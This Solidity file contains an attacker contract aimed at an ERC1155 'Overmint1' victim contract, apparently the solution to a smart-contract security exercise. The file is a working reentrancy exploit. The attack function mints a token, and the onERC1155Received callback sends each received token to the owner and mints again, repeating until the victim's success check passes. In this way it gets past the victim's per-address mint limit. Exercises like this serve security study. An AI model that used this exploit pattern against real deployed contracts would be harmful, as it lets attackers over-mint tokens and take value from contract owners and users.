// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
import "../Overmint1-ERC1155.sol";

contract Overmint1_ERC1155_Attacker is IERC1155Receiver, Ownable {
    Overmint1_ERC1155 victim;
    uint256 constant ID = 0;

    constructor(Overmint1_ERC1155 _victim) {
        victim = _victim;
    }

    function attack() external {
        victim.mint(ID, "");
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        assert(id == ID);
        assert(victim.balanceOf(address(this), ID) == 1);
        // safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data)
        victim.safeTransferFrom(address(this), owner(), id, value, data);
        assert(victim.balanceOf(address(this), ID) == 0);

        if (!victim.success(owner(), id)) {
            victim.mint(id, "");
        }

        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {}

    function supportsInterface(bytes4 interfaceId) external view returns (bool) {}
}
